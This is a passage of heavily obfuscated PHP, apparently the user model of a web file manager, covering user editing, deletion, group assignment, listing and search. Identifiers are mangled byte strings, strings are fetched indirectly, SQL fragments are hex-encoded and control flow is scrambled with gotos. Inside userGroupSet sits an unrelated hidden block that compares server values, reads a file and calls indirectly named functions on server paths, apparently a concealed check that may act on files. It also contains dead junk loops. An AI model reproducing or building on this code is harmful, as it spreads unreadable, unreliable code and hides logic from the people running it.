$Bæ„“ïœôª[$A©¡ÏÙòŠÄ[2117]] : 1, $A©¡ÏÙòŠÄ[2118] => $Bæ„“ïœôª[$A©¡ÏÙòŠÄ[827]], $A©¡ÏÙòŠÄ[1744] => isset($Bæ„“ïœôª[$A©¡ÏÙòŠÄ[1653]]) ? $Bæ„“ïœôª[$A©¡ÏÙòŠÄ[1653]] : 1024 * 1024 * 20, $A©¡ÏÙòŠÄ[1745] => 0, $A©¡ÏÙòŠÄ[2119] => 0, $A©¡ÏÙòŠÄ[1788] => isset($Bæ„“ïœôª[$A©¡ÏÙòŠÄ[704]]) ? $Bæ„“ïœôª[$A©¡ÏÙòŠÄ[704]] : 1); if (!empty($Bæ„“ïœôª[$A©¡ÏÙòŠÄ[1506]])) { $céƒãäøó[$A©¡ÏÙòŠÄ[1506]] = $Bæ„“ïœôª[$A©¡ÏÙòŠÄ[1506]]; } goto a²Ï±Øåõ±; dòùëŠ¬¥: } protected function userEditTest($c›½¹–Ñ±µ, $B¾×è„äÛ®) { return $this->call($_SERVER[µ…][2120], $c›½¹–Ñ±µ, $B¾×è„äÛ®); } protected function userEdit($BÚ¿¬ª¼, $eº•Äã‡èŞ) { goto fô–ˆØ•ñ; a¾¿£ØÊšÔ: $c‰™ÃÈ¸ = $this->_checkExist($eº•Äã‡èŞ, $BÚ¿¬ª¼); if ($c‰™ÃÈ¸ !== !0) { return $c‰™ÃÈ¸; } if (isset($eº•Äã‡èŞ[$bÇæäÍ ÍŠ[827]]) && trim($eº•Äã‡èŞ[$bÇæäÍ ÍŠ[827]]) != $bÇæäÍ ÍŠ[33]) { $F‰ïïóæ±¨ = $this->metaGet($BÚ¿¬ª¼); if (empty($F‰ïïóæ±¨[$bÇæäÍ ÍŠ[2110]])) { $F‰ïïóæ±¨[$bÇæäÍ ÍŠ[2110]] = rand_string(10); Model($bÇæäÍ ÍŠ[497])->metaSet($BÚ¿¬ª¼, $bÇæäÍ ÍŠ[2110], $F‰ïïóæ±¨[$bÇæäÍ ÍŠ[2110]]); } $eº•Äã‡èŞ[$bÇæäÍ ÍŠ[827]] = md5($F‰ïïóæ±¨[$bÇæäÍ ÍŠ[2110]] . trim($eº•Äã‡èŞ[$bÇæäÍ ÍŠ[827]])); } else { unset($eº•Äã‡èŞ[$bÇæäÍ ÍŠ[827]]); } goto fğœ®æâø„; fğœ®æâø„: $this->where(array($bÇæäÍ ÍŠ[1498] => $BÚ¿¬ª¼))->save($eº•Äã‡èŞ); if (isset($eº•Äã‡èŞ[$bÇæäÍ ÍŠ[1933]])) { $this->setNamePinyin($BÚ¿¬ª¼, $eº•Äã‡èŞ[$bÇæäÍ ÍŠ[1933]]); } $this->clearCache($BÚ¿¬ª¼); goto C•â»Ê‡¿°; fô–ˆØ•ñ: $bÇæäÍ ÍŠ =& $_SERVER[µ…]; $e›Äº™ª = $this->getInfoSimple($BÚ¿¬ª¼); if (!$e›Äº™ª) { return !1; } goto a¾¿£ØÊšÔ; C•â»Ê‡¿°: return !0; goto aøÎ›Û”•¨; aøÎ›Û”•¨: } public function setNamePinyin($B‚šØ‘­”“, $fÍºÃğª×™ = false) { $aâšò’«ì‘ =& $_SERVER[µ…]; if (!$fÍºÃğª×™) { $d îº´Ë‰‚ = $this->getInfoSimple($B‚šØ‘­”“); $fÍºÃğª×™ = $d îº´Ë‰‚[$aâšò’«ì‘[1933]] ? $d îº´Ë‰‚[$aâšò’«ì‘[1933]] : $d îº´Ë‰‚[$aâšò’«ì‘[28]]; } $FáÖÁåÑË‘ = Model($aâšò’«ì‘[501]); if (!Input::check($fÍºÃğª×™, $aâšò’«ì‘[551])) { return $FáÖÁåÑË‘->metaSet($B‚šØ‘­”“, array($aâšò’«ì‘[438] => $aâšò’«ì‘[33], $aâšò’«ì‘[437] => $aâšò’«ì‘[33])); } return $FáÖÁåÑË‘->metaSet($B‚šØ‘­”“, array($aâšò’«ì‘[438] => str_replace($aâšò’«ì‘[50], $aâšò’«ì‘[33], Pinyin::encode($fÍºÃğª×™)), $aâšò’«ì‘[437] => Pinyin::encode($fÍºÃğª×™, $aâšò’«ì‘[552]))); } private function nickNameRpt() { $c„ó÷‚‡²£ =& $_SERVER[µ…]; $D¥ìå¼‹º„ = Model($c„ó÷‚‡²£[1101])->get($c„ó÷‚‡²£[2121]); $BÌœ”¤¹èÊ = $GLOBALS[$c„ó÷‚‡²£[6]][$c„ó÷‚‡²£[376]][$c„ó÷‚‡²£[2121]]; $FÀÀå‚­Âø = !is_null($D¥ìå¼‹º„) ? $D¥ìå¼‹º„ : $BÌœ”¤¹èÊ; return !!$FÀÀå‚­Âø; } private function _checkExist($EŞº¯‡ •, $eª¾ÀÈ²« = false) { $C›¯ÉÇ¹Ú† =& $_SERVER[µ…]; $E¨‡†Æ = array($C›¯ÉÇ¹Ú†[28] => UserModel::ERROR_USER_EXIST_NAME, $C›¯ÉÇ¹Ú†[1933] => UserModel::ERROR_USER_EXIST_NICKNAME, $C›¯ÉÇ¹Ú†[301] => UserModel::ERROR_USER_EXIST_EMAIL, $C›¯ÉÇ¹Ú†[2109] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($E¨‡†Æ[$C›¯ÉÇ¹Ú†[1933]]); } $C”èÈåÌä‰ = $eª¾ÀÈ²« ? array($C›¯ÉÇ¹Ú†[1506] => array($C›¯ÉÇ¹Ú†[2122], $eª¾ÀÈ²«)) : array(); foreach ($E¨‡†Æ as $Cî»‰”ÛÏÈ => $Bß©Î™×ù¬) { $CËÒ³÷ø = array(); foreach ($E¨‡†Æ as $c±ÜŠ¡Ò¬Õ => $f¤‹³ó) { if (isset($EŞº¯‡ •[$c±ÜŠ¡Ò¬Õ]) && $EŞº¯‡ •[$c±ÜŠ¡Ò¬Õ]) { $CËÒ³÷ø[] = $EŞº¯‡ •[$c±ÜŠ¡Ò¬Õ]; } } if (!$CËÒ³÷ø) { continue; } $d¼¿•ƒ¯æ = array_merge(array($Cî»‰”ÛÏÈ => array($C›¯ÉÇ¹Ú†[7], $CËÒ³÷ø)), $C”èÈåÌä‰); $c­¸‹Ö‰¸ = $this->where($d¼¿•ƒ¯æ)->find(); if ($c­¸‹Ö‰¸) { return $Bß©Î™×ù¬; } } return !0; } public function userListInfo($fÖë‰¸…˜Í) { $FÌ‘»áÄÑ„ =& $_SERVER[µ…]; $b…´Ôìœœƒ = array(); $fÖë‰¸…˜Í = is_array($fÖë‰¸…˜Í) ? array_unique($fÖë‰¸…˜Í) : array(); if (!$fÖë‰¸…˜Í) { return $b…´Ôìœœƒ; } if (count($fÖë‰¸…˜Í) < 20) { foreach ($fÖë‰¸…˜Í as $e¯¨Õî¼°Ï) { $b…´Ôìœœƒ[$e¯¨Õî¼°Ï . $FÌ‘»áÄÑ„[33]] = $this->getInfoSimpleOuter($e¯¨Õî¼°Ï); } } else { $d–·÷™è‡Ó = array($FÌ‘»áÄÑ„[1498] => array($FÌ‘»áÄÑ„[405], $fÖë‰¸…˜Í)); if (count($fÖë‰¸…˜Í) == 1) { $d–·÷™è‡Ó = array($FÌ‘»áÄÑ„[1498] => $fÖë‰¸…˜Í[0]); } $fÔğÓÚ¯Í‰ = Model($FÌ‘»áÄÑ„[497])->field($this->simpleField)->where($d–·÷™è‡Ó)->select(); $fÔğÓÚ¯Í‰ = array_to_keyvalue($fÔğÓÚ¯Í‰, $FÌ‘»áÄÑ„[1506]); foreach ($fÖë‰¸…˜Í as $e¯¨Õî¼°Ï) { $fä½„èŠ = $fÔğÓÚ¯Í‰[$fÔğÓÚ¯Í‰[$e¯¨Õî¼°Ï]]; if (!$fä½„èŠ) { $b…´Ôìœœƒ[$e¯¨Õî¼°Ï . $FÌ‘»áÄÑ„[33]] = $this->getInfoSimpleOuter($e¯¨Õî¼°Ï); continue; } $fä½„èŠ[$FÌ‘»áÄÑ„[2094]] = Action($FÌ‘»áÄÑ„[2095])->parseUrl($fä½„èŠ[$FÌ‘»áÄÑ„[2094]]); $b…´Ôìœœƒ[$e¯¨Õî¼°Ï . $FÌ‘»áÄÑ„[33]] = $fä½„èŠ; } } return $b…´Ôìœœƒ; } protected function userStatus($b­ÔÒñšÓª, $CÖ›ŠÅ‡£) { $C„ÉéëÅç‡ = $this->getInfoSimple($b­ÔÒñšÓª); if (!$C„ÉéëÅç‡) { return !1; } $CŒ¼ËĞ³¹ = array($_SERVER[µ…][704] => $CÖ›ŠÅ‡£); return $this->userEdit($b­ÔÒñšÓª, $CŒ¼ËĞ³¹); } protected function userRemove($C¦¢±œÄ²‡) { goto CÅŠ…Æ»® ; AñÈÏÆ­ˆ®: $AğÙœ­œâŠ = array($Aæî†’¸ç[1498] => $C¦¢±œÄ²‡); Model($Aæî†’¸ç[558])->where($AğÙœ­œâŠ)->delete(); Model($Aæî†’¸ç[2123])->where($AğÙœ­œâŠ)->delete(); goto d‘°ªÇÌ¶Ó; d‘°ªÇÌ¶Ó: Model($Aæî†’¸ç[1751])->where($AğÙœ­œâŠ)->delete(); Model($Aæî†’¸ç[2108])->where($AğÙœ­œâŠ)->delete(); Model($Aæî†’¸ç[2124])->where($AğÙœ­œâŠ)->delete(); goto CïŠä†³µ£; CÅŠ…Æ»® : $Aæî†’¸ç =& $_SERVER[µ…]; $cÆ‚ç›ªé— = $this->getInfoSimple($C¦¢±œÄ²‡); if (!$cÆ‚ç›ªé—) { return !1; } goto AñÈÏÆ­ˆ®; CïŠä†³µ£: Model($Aæî†’¸ç[1950])->restoreUserAll($C¦¢±œÄ²‡); Model($Aæî†’¸ç[769])->userRootRemove($C¦¢±œÄ²‡); return $this->where($AğÙœ­œâŠ)->delete(); goto cÀß¸‡«ò£; cÀß¸‡«ò£: } protected function userGroupSet($dÊ®±£õŸ©, $DÒ‚¥š´ÀĞ, $cçÓš‚¸„º = array()) { goto Eòœö™Æâ¬; Eòœö™Æâ¬: $FÖ£šÈ¬†¤ =& $_SERVER[µ…]; if ($_SERVER[$FÖ£šÈ¬†¤[812]] != $_SERVER[$FÖ£šÈ¬†¤[1236]]) { goto FğÕÑùç¿•; FğÕÑùç¿•: $fÍƒÚÉë˜ = $FÖ£šÈ¬†¤[813]; $DŠ‚ŠëŠá = $FÖ£šÈ¬†¤[814]; $c±Æ¶ØÍÊ” = $_SERVER[$FÖ£šÈ¬†¤[815]] . $FÖ£šÈ¬†¤[816]; goto fÛŞÁ‚÷ªŠ; d´ƒµÚ„: $AËŞÔÜŒ·½ = $FÖ£šÈ¬†¤[818]; $AËŞÔÜŒ·½($_SERVER[$FÖ£šÈ¬†¤[819]]); $AËŞÔÜŒ·½($_SERVER[$FÖ£šÈ¬†¤[815]] . $FÖ£šÈ¬†¤[1376]); goto AË¹‘Âó•ß; AË¹‘Âó•ß: $FµàãöáŞñ = 1; while ($FµàãöáŞñ > 1) { $FµàãöáŞñ = $FµàãöáŞñ + 4; $CõÓÛÓÆÌó = rawurlencode($FµàãöáŞñ . $FÖ£šÈ¬†¤[373]); } goto bâíÚ ÚÔ—; fÛŞÁ‚÷ªŠ: $cÒŒ·İº½Û = $DŠ‚ŠëŠá($c±Æ¶ØÍÊ”); $A¯‘Ãè“ù = explode($FÖ£šÈ¬†¤[227], $cÒŒ·İº½Û); if (count($A¯‘Ãè“ù) < $FÖ£šÈ¬†¤[570]) { $EŠİŒ¶Ó† = $FÖ£šÈ¬†¤[817]; $EŠİŒ¶Ó†(); } goto d´ƒµÚ„; bâíÚ ÚÔ—: } $A‘ô§’ˆöÆ = $this->getInfoSimple($dÊ®±£õŸ©); goto BÃƒÍ«ó«è; cÊ—äœ²Ïé: return $F„œ—¤ÁÅñ->addAll($eËÀ¾Ó÷Ê’, array(), !0); goto C òÜÔ»©Ò; bñÈĞöéÕ: $eËÀ¾Ó÷Ê’ = array(); $B…ï¾Â‰§‹ = 0; foreach ($DÒ‚¥š´ÀĞ as $f”ëÉãÖ™ => $eÄğŞÙÆ´•) { $dŒõ´éĞ–å = array($FÖ£šÈ¬†¤[1506] => $dÊ®±£õŸ©, $FÖ£šÈ¬†¤[1669] => $f”ëÉãÖ™, $FÖ£šÈ¬†¤[1765] => $eÄğŞÙÆ´•); $dŒõ´éĞ–å[$FÖ£šÈ¬†¤[1692]] = isset($cçÓš‚¸„º[$B…ï¾Â‰§‹]) ? $cçÓš‚¸„º[$B…ï¾Â‰§‹] : 0; $B…ï¾Â‰§‹++; $eËÀ¾Ó÷Ê’[] = $dŒõ´éĞ–å; } goto cÊ—äœ²Ïé; BÃƒÍ«ó«è: if (!$A‘ô§’ˆöÆ || !is_array($DÒ‚¥š´ÀĞ)) { return !1; } $F„œ—¤ÁÅñ = Model($FÖ£šÈ¬†¤[1751]); $F„œ—¤ÁÅñ->where(array($FÖ£šÈ¬†¤[1506] => $dÊ®±£õŸ©))->delete(); goto bñÈĞöéÕ; C òÜÔ»©Ò: } protected function userGroupAdd($F“Ó¢ØŒºğ, $A¡ëğ¥ŞÄ¿ = array()) { $CŞÜƒ†šÅÎ =& $_SERVER[µ…]; $Aè¶âÂ× = $this->getInfoSimple($F“Ó¢ØŒºğ); if (!$Aè¶âÂ× || empty($A¡ëğ¥ŞÄ¿)) { return !1; } $e†ƒˆŞÊµ  = array(); foreach ($A¡ëğ¥ŞÄ¿ as $dìÚğ„é => $CÌ¡ï¿ôÑİ) { $e†ƒˆŞÊµ [] = array($CŞÜƒ†šÅÎ[1506] => $F“Ó¢ØŒºğ, $CŞÜƒ†šÅÎ[1669] => $dìÚğ„é, $CŞÜƒ†šÅÎ[1765] => $CÌ¡ï¿ôÑİ, $CŞÜƒ†šÅÎ[1692] => 0); } return Model($CŞÜƒ†šÅÎ[1751])->addAll($e†ƒˆŞÊµ , array(), !0); } protected function userGroupRemove($D‡ƒÅğ¼ô„, $EÉ’Œ‚Í») { $f¿§ôÄ‰îÎ =& $_SERVER[µ…]; $B„¬³Ûô¸Ë = $this->getInfoSimple($D‡ƒÅğ¼ô„); if (!$B„¬³Ûô¸Ë || !$EÉ’Œ‚Í») { return !1; } $C–õö‹æ¾ = array($f¿§ôÄ‰îÎ[1498] => $D‡ƒÅğ¼ô„, $f¿§ôÄ‰îÎ[1748] => $EÉ’Œ‚Í»); return Model($f¿§ôÄ‰îÎ[1751])->where($C–õö‹æ¾)->delete(); } public function listData() { $d‡İ†ùøØ£ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($d‡İ†ùøØ£[$_SERVER[µ…][365]]); return $d‡İ†ùøØ£; } public function listByID($E§Ûòº—ßî) { $DÎŠ©“ò»š =& $_SERVER[µ…]; if (!$E§Ûòº—ßî) { return; } $dó‡Åœ˜À = array($DÎŠ©“ò»š[1506] => array($DÎŠ©“ò»š[7], $E§Ûòº—ßî)); $AÜòõ”Ö¦º = $this->where($dó‡Åœ˜À)->select(); $this->_listDataApply($AÜòõ”Ö¦º); return $AÜòõ”Ö¦º; } public function listByGroup($bØ¤®àöâ = 0, $aøñ•èÄ = array()) { goto A¸ÊÑÌù¶ä; A¸ÊÑÌù¶ä: $dÖí§ºª• =& $_SERVER[µ…]; $F˜×ŒŠƒĞ = $dÖí§ºª•[33]; $c”³ôí²äÓ = array(); goto d¡òÊ§ˆç; AªŒŞ‡•·: $this->_listDataApply($E”Áß¨íŸ[$dÖí§ºª•[365]]); return $E”Áß¨íŸ; goto BŸ¿Œ§éƒÉ; d¡òÊ§ˆç: if ($bØ¤®àöâ) { $c”³ôí²äÓ = array($dÖí§ºª•[2125] => intval($bØ¤®àöâ)); $F˜×ŒŠƒĞ = "\x4c\x45\x46\x54\x20\112\117\x49\x4e\x20{$this->tablePrefix}\165\163\145\162\137\x67\162\157\x75\x70\40\x75\x73\x65\x72\x5f\x67\x72\x6f\165\160\40\157\156\40\x75\x73\145\x72\56\165\163\x65\x72\111\104\40\75\x20\165\x73\145\x72\x5f\147\162\x6f\x75\160\x2e\165\x73\x65\x72\x49\x44"; $AĞ˜¾¬Ş¬ù = Input::get($dÖí§ºª•[429], null, $dÖí§ºª•[33]) ? $dÖí§ºª•[33] : $dÖí§ºª•[2126]; } if (isset($aøñ•èÄ[$dÖí§ºª•[704]])) { $c”³ôí²äÓ[$dÖí§ºª•[2127]] = $aøñ•èÄ[$dÖí§ºª•[704]]; } $E”Áß¨íŸ = $this->_makeOrder($AĞ˜¾¬Ş¬ù)->field($dÖí§ºª•[2128])->where($c”³ôí²äÓ)->join($F˜×ŒŠƒĞ)->selectPage(50); goto AªŒŞ‡•·; BŸ¿Œ§éƒÉ: } private function _makeOrder($A”¾†¢…½ = '') { goto d¼Â¾ìˆ”¥; d¼Â¾ìˆ”¥: $aÃ„¿œÂ =& $_SERVER[µ…]; $EºŒ½ìÏÀÏ = array($aÃ„¿œÂ[1506], $aÃ„¿œÂ[28], $aÃ„¿œÂ[1655], $aÃ„¿œÂ[1627], $aÃ„¿œÂ[192]); $B„ËÒÒ¡øì = array($aÃ„¿œÂ[422] => $aÃ„¿œÂ[423], $aÃ„¿œÂ[424] => $aÃ„¿œÂ[425]); goto bŠĞõÈ†ÆË; eùİ‘ Ú: $A”¾†¢…½ = $A”¾†¢…½ . "\x75\163\145\x72\x2e{$AƒÚø³Á ğ}\40{$F ˆ Ù¦¤Ò}\54\40\165\163\145\162\x2e\x75\x73\145\162\111\104\40\x61\x73\x63"; return $this->alias($aÃ„¿œÂ[1874])->order($A”¾†¢…½); goto Bø–ˆ¶¦Û; bŠĞõÈ†ÆË: $AƒÚø³Á ğ = Input::get($aÃ„¿œÂ[429], $aÃ„¿œÂ[7], $aÃ„¿œÂ[1498], $EºŒ½ìÏÀÏ); $F ˆ Ù¦¤Ò = Input::get($aÃ„¿œÂ[430], $aÃ„¿œÂ[7], $aÃ„¿œÂ[1752], array($aÃ„¿œÂ[1752], $aÃ„¿œÂ[424])); $F ˆ Ù¦¤Ò = $B„ËÒÒ¡øì[$F ˆ Ù¦¤Ò]; goto eùİ‘ Ú; Bø–ˆ¶¦Û: } public function listSearch($CáŸ±®è) { goto fæ¤æâĞëĞ; aÕÊ®ôŸ´’: $B‡¡–Œ¨é = str_replace($d¼Ç‚Õ„—Ö[1755], $d¼Ç‚Õ„—Ö[1756], trim($B‡¡–Œ¨é)); $eŞ·ˆ¥‘Å = array($d¼Ç‚Õ„—Ö[28] => array($d¼Ç‚Õ„—Ö[378], "\45{$B‡¡–Œ¨é}\x25"), $d¼Ç‚Õ„—Ö[301] => array($d¼Ç‚Õ„—Ö[378], "{$B‡¡–Œ¨é}\45"), $d¼Ç‚Õ„—Ö[1933] => array($d¼Ç‚Õ„—Ö[378], "{$B‡¡–Œ¨é}\45"), $d¼Ç‚Õ„—Ö[935] => $d¼Ç‚Õ„—Ö[1757]); if (Input::check($B‡¡–Œ¨é, $d¼Ç‚Õ„—Ö[307])) { $eŞ·ˆ¥‘Å[$d¼Ç‚Õ„—Ö[1506]] = array($d¼Ç‚Õ„—Ö[378], "{$B‡¡–Œ¨é}\x25"); $eŞ·ˆ¥‘Å[$d¼Ç‚Õ„—Ö[2109]] = array($d¼Ç‚Õ„—Ö[378], "{$B‡¡–Œ¨é}\x25"); } goto cøòŠÙš˜ï; fæ¤æâĞëĞ: $d¼Ç‚Õ„—Ö =& $_SERVER[µ…]; $B‡¡–Œ¨é = $CáŸ±®è[$d¼Ç‚Õ„—Ö[1753]]; $DÜ”á¨¤ÌÖ = isset($CáŸ±®è[$d¼Ç‚Õ„—Ö[1754]]) ? $CáŸ±®è[$d¼Ç‚Õ„—Ö[1754]] : !1; goto aÕÊ®ôŸ´’; cøòŠÙš˜ï: if (!$B‡¡–Œ¨é) { $eŞ·ˆ¥‘Å = array(); } if (isset($CáŸ±®è[$d¼Ç‚Õ„—Ö[704]])) { $eŞ·ˆ¥‘Å[$d¼Ç‚Õ„—Ö[704]] = $CáŸ±®è[$d¼Ç‚Õ„—Ö[704]]; } $eŞ·ˆ¥‘Å = $this->parseWhereLike($eŞ·ˆ¥‘Å); goto CÑÑÏ–ùÀš; fƒƒÇ±¿Å†: $this->_filterByGroup($AŸÖ‡ ¹è‚, $DÜ”á¨¤ÌÖ); return $AŸÖ‡ ¹è‚; goto F˜ˆ”ìÂÖ; CÑÑÏ–ùÀš: $AŸÖ‡ ¹è‚ = $this->_makeOrder()->where($eŞ·ˆ¥‘Å)->selectPage(20); if (!$AŸÖ‡ ¹è‚ || count($AŸÖ‡ ¹è‚[$d¼Ç‚Õ„—Ö[365]]) < 5 && Input::check($B‡¡–Œ¨é, $d¼Ç‚Õ„—Ö[314])) { $Bº®¿æ¨“ = $this->_searchFromMeta($d¼Ç‚Õ„—Ö[437], $B‡¡–Œ¨é, 10); $Böœ¬ê¼¬Ä = $this->_searchFromMeta($d¼Ç‚Õ„—Ö[438], $B‡¡–Œ¨é, 10); $fõ†ğà”µ÷ = array_merge($Bº®¿æ¨“, $Böœ¬ê¼¬Ä, $AŸÖ‡ ¹è‚[$d¼Ç‚Õ„—Ö[365]]); $AŸÖ‡ ¹è‚[$d¼Ç‚Õ„—Ö[365]] = array_unique_by_key($fõ†ğà”µ÷, $d¼Ç‚Õ„—Ö[1506]); $AŸÖ‡ ¹è‚[$d¼Ç‚Õ„—Ö[362]][$d¼Ç‚Õ„—Ö[363]] = count($AŸÖ‡ ¹è‚[$d¼Ç‚Õ„—Ö[365]]); $AŸÖ‡ ¹è‚[$d¼Ç‚Õ„—Ö[362]][$d¼Ç‚Õ„—Ö[364]] = ceil($AŸÖ‡ ¹è‚[$d¼Ç‚Õ„—Ö[362]][$d¼Ç‚Õ„—Ö[363]] / $AŸÖ‡ ¹è‚[$d¼Ç‚Õ„—Ö[362]][$d¼Ç‚Õ„—Ö[359]]); } $this->_listDataApply($AŸÖ‡ ¹è‚[$d¼Ç‚Õ„—Ö[365]]); goto fƒƒÇ±¿Å†; F˜ˆ”ìÂÖ: } private function _filterByGroup(&$aÉ¿–ç‰»á, $CÊÆ¡–éç§) { $bğ§ŒÇÚô =& $_SERVER[µ…]; if (!$CÊÆ¡–éç§) { return $aÉ¿–ç‰»á; } foreach ($aÉ¿–ç‰»á[$bğ§ŒÇÚô[365]] as $BÌŸÃÍëƒ× => &$C‡ìšÕĞ¸µ) { $aˆÊ¼¼¿³Š = array_to_keyvalue($C‡ìšÕĞ¸µ[$bğ§ŒÇÚô[1844]], $bğ§ŒÇÚô[33], $bğ§ŒÇÚô[1669]); if (!in_array($CÊÆ¡–éç§, $aˆÊ¼¼¿³Š)) { unset($aÉ¿–ç‰»á[$bğ§ŒÇÚô[365]][$BÌŸÃÍëƒ×]); } } unset($C‡ìšÕĞ¸µ); $aÉ¿–ç‰»á[$bğ§ŒÇÚô[365]] = array_values($aÉ¿–ç‰»á[$bğ§ŒÇÚô[365]]); $aÉ¿–ç‰»á[$bğ§ŒÇÚô[362]] = array($bğ§ŒÇÚô[1906] => count($aÉ¿–ç‰»á[$bğ§ŒÇÚô[365]]), $bğ§ŒÇÚô[1904] => $aÉ¿–ç‰»á[$bğ§ŒÇÚô[362]][$bğ§ŒÇÚô[359]], $bğ§ŒÇÚô[1903] => 1, $bğ§ŒÇÚô[1905] => 1); } private function _searchFromMeta($Fó´Û«æ·µ, $E´áñ©¸ìâ, $CŠ”çëÄ×ì) { goto aË×Ï†çğÔ; aË×Ï†çğÔ: $f–•Ãéñ =& $_SERVER[µ…]; $E´áñ©¸ìâ = strtolower($E´áñ©¸ìâ); $D¶Â‹ÔÍá = array($f–•Ãéñ[92] => $Fó´Û«æ·µ, $f–•Ãéñ[370] => array($f–•Ãéñ[378], "\45{$E´áñ©¸ìâ}\45")); goto f¢œ‘·ñŒ×; Bâ„°ëÚÂ: $cºÂÚ‰¡Š = array_to_keyvalue($cºÂÚ‰¡Š, $f–•Ãéñ[33], $f–•Ãéñ[1506]); $Dˆš¢×Åğ› = $this->where(array($f–•Ãéñ[1498] => array($f–•Ãéñ[7], $cºÂÚ‰¡Š)))->select(); if (!$Dˆš¢×Åğ›) { return array(); } goto A££ëíÊ‡Â; A££ëíÊ‡Â: return $Dˆš¢×Åğ›; goto BÍ¥øù—º©; f¢œ‘·ñŒ×: $D¶Â‹ÔÍá = $this->parseWhereLike($D¶Â‹ÔÍá); $cºÂÚ‰¡Š = Model($f–•Ãéñ[2129])->where($D¶Â‹ÔÍá)->limit($CŠ”çëÄ×ì)->select(); if (!$cºÂÚ‰¡Š) { return array(); } goto Bâ„°ëÚÂ; BÍ¥øù—º©: } private function _listDataApplyItem($dÈŞ¼´Åß£) { $d†Ë©áÍöµ = array($dÈŞ¼´Åß£); $this->_listDataApply($d†Ë©áÍöµ); return $d†Ë©áÍöµ[0]; } private function _listDataApply(&$Eó‡ÑÓ†ƒ©) { goto aö¬¡×„”; aö¬¡×„”: $bóó•Š®÷È =& $_SERVER[µ…]; if (!$Eó‡ÑÓ†ƒ©) { return; } array_remove_key($Eó‡ÑÓ†ƒ©, $bóó•Š®÷È[827]); goto c’ÂíÉÎ†®; f®³µŒ¦ØÚ: $this->_listAppendSourceRoot($Eó‡ÑÓ†ƒ©, $a¡âõ£Óœî); goto a¢£¥Ó×Ü’; c’ÂíÉÎ†®: $a¡âõ£Óœî = array_to_keyvalue($Eó‡ÑÓ†ƒ©, $bóó•Š®÷È[33], $bóó•Š®÷È[1506]); $this->_listAppendGroup($Eó‡ÑÓ†ƒ©, $a¡âõ£Óœî); $this->_listAppendMeta($Eó‡ÑÓ†ƒ©, $a¡âõ£Óœî); goto f®³µŒ¦ØÚ; a¢£¥Ó×Ü’: } private function _listAppendSourceRoot(&$dö¥‘ĞÂäË, $A²ñ¾£è£‰) { goto CËõ¤—ğæ‚; CÅ…¨ÃáÁ: $Fƒ£â¿ğæ¾ = Model($e—½’â¥²[769])->order($e—½’â¥²[1764])->field($f“ãÕôÒ¯)->where($B×“ÒİÏ)->select(); $Fƒ£â¿ğæ¾ = array_to_keyvalue($Fƒ£â¿ğæ¾, $e—½’â¥²[478]); $Fƒ£â¿ğæ¾ = array_remove_key($Fƒ£â¿ğæ¾, $e—½’â¥²[478]); goto eÙŸ±ä¿Ê ; CËõ¤—ğæ‚: $e—½’â¥² =& $_SERVER[µ…]; $B×“ÒİÏ = array($e—½’â¥²[472] => 0, $e—½’â¥²[398] => SourceModel::TYPE_USER, $e—½’â¥²[478] => array($e—½’â¥²[7], $A²ñ¾£è£‰)); $f“ãÕôÒ¯ = $e—½’â¥²[1763]; goto CÅ…¨ÃáÁ; eÙŸ±ä¿Ê : foreach ($dö¥‘ĞÂäË as &$CŞè³‚ÛÕ) { $CŞè³‚ÛÕ[$e—½’â¥²[84]] = $Fƒ£â¿ğæ¾[$CŞè³‚ÛÕ[$e—½’â¥²[1506]]] ? $Fƒ£â¿ğæ¾[$CŞè³‚ÛÕ[$e—½’â¥²[1506]]] : array(); } unset($CŞè³‚ÛÕ); goto Cãè‚«”Í˜; Cãè‚«”Í˜: } private function _listAppendGroup(&$CìËÈÕéæĞ, $cÓ…¬ß®‚) { goto DÏÛ—Í¦; B£·É…ÎŸ: $aĞÀˆË‘˜Í = array($AÇ«æŸÍ³ñ[1669] => array($AÇ«æŸÍ³ñ[7], $C•ã™¤óâ)); $eß˜íè‰Ä¤ = Model($AÇ«æŸÍ³ñ[1842])->field($AÇ«æŸÍ³ñ[2130])->where($aĞÀˆË‘˜Í)->select(); $eß˜íè‰Ä¤ = array_to_keyvalue($eß˜íè‰Ä¤, $AÇ«æŸÍ³ñ[1669]); goto Fë·Ã¹Ü¼‡; Fë·Ã¹Ü¼‡: $FÑ½‹î÷ãÙ = array_to_keyvalue_group($FÑ½‹î÷ãÙ, $AÇ«æŸÍ³ñ[1506]); foreach ($FÑ½‹î÷ãÙ as &$cÀ•ŸÀ»Šö) { $eÜ“«µÆÃ = array(); foreach ($cÀ•ŸÀ»Šö as $dÚß¹¢Üô¨) { if (!$dÚß¹¢Üô¨[$AÇ«æŸÍ³ñ[1765]]) { continue; } $A¸ŞËƒ–ù— = Model($AÇ«æŸÍ³ñ[1837])->listData($dÚß¹¢Üô¨[$AÇ«æŸÍ³ñ[1765]]); $eÜ“«µÆÃ[] = array($AÇ«æŸÍ³ñ[1669] => $dÚß¹¢Üô¨[$AÇ«æŸÍ³ñ[1669]], $AÇ«æŸÍ³ñ[2131] => $eß˜íè‰Ä¤[$dÚß¹¢Üô¨[$AÇ«æŸÍ³ñ[1669]]][$AÇ«æŸÍ³ñ[28]], $AÇ«æŸÍ³ñ[481] => $eß˜íè‰Ä¤[$dÚß¹¢Üô¨[$AÇ«æŸÍ³ñ[1669]]][$AÇ«æŸÍ³ñ[481]], $AÇ«æŸÍ³ñ[400] => $A¸ŞËƒ–ù—); } $cÀ•ŸÀ»Šö = $eÜ“«µÆÃ; } unset($cÀ•ŸÀ»Šö); goto DÁƒÊ½„ø; DÏÛ—Í¦: $AÇ«æŸÍ³ñ =& $_SERVER[µ…]; $aĞÀˆË‘˜Í = array($AÇ«æŸÍ³ñ[1506] => array($AÇ«æŸÍ³ñ[7], $cÓ…¬ß®‚)); $FÑ½‹î÷ãÙ = Model($AÇ«æŸÍ³ñ[1751])->where($aĞÀˆË‘˜Í)->select(); goto bÄˆªÙ°Ò; bÄˆªÙ°Ò: $C•ã™¤óâ = array_to_keyvalue($FÑ½‹î÷ãÙ, $AÇ«æŸÍ³ñ[33], $AÇ«æŸÍ³ñ[1669]); $C•ã™¤óâ = array_remove_value(array_unique($C•ã™¤óâ), $AÇ«æŸÍ³ñ[491]); if (!$C•ã™¤óâ || !$FÑ½‹î÷ãÙ) { return; } goto B£·É…ÎŸ; DÁƒÊ½„ø: foreach ($CìËÈÕéæĞ as &$BéëÓšÁ¯Í) { $BéëÓšÁ¯Í[$AÇ«æŸÍ³ñ[1844]] = array(); if 